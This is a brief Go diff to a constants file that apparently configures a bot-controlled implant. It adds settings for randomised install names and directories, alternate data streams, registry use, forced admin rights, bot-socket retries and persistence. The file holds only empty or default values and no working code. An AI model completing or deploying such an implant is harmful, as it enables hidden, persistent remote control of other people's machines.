@@ -8,6 +8,7 @@ const (
 	CRYPTO_KEY string = ""
 )
 
+// bot
 const (
 	BOT_TOKEN   string = ""
 	SERVER_ID   string = ""
@@ -18,25 +19,35 @@ const (
 	TRACKING_ID string = ""
 )
 
+// setup
 const (
 	USE_CUSTOM_NAME bool   = false
+	USE_RANDOM_NAME bool   = false
 	CUSTOM_NAME     string = ""
 
 	USE_CUSTOM_DIR bool   = false
+	USE_RANDOM_DIR bool   = false
 	CUSTOM_DIR     string = ""
+
+	USE_ADS         bool   = false
+	CUSTOM_ADS_PATH string = ""
+
+	USE_REGISTRY bool = false
 )
 
+// options
 const (
 	REQUIRE_ADMIN          bool = false
 	PROMPT_ADMIN           bool = false
 	FORCE_ADMIN            bool = false
 	CONTINUE_WITHOUT_ADMIN bool = false
 
-	OPEN_BOT_SOCKET_MAX_RETRIES int  = 0
-	OPEN_BOT_SOCKET_DELAY       int  = 0
-	EXIT_IF_CANT_CONNECT        bool = false
+	OPEN_BOT_SOCKET_MAX_RETRIES int  = 50
+	OPEN_BOT_SOCKET_DELAY       int  = 100
+	EXIT_IF_CANT_CONNECT        bool = true
 )
 
+// persistence
 const (
 	PERSISTENCE_NAME string = ""
 
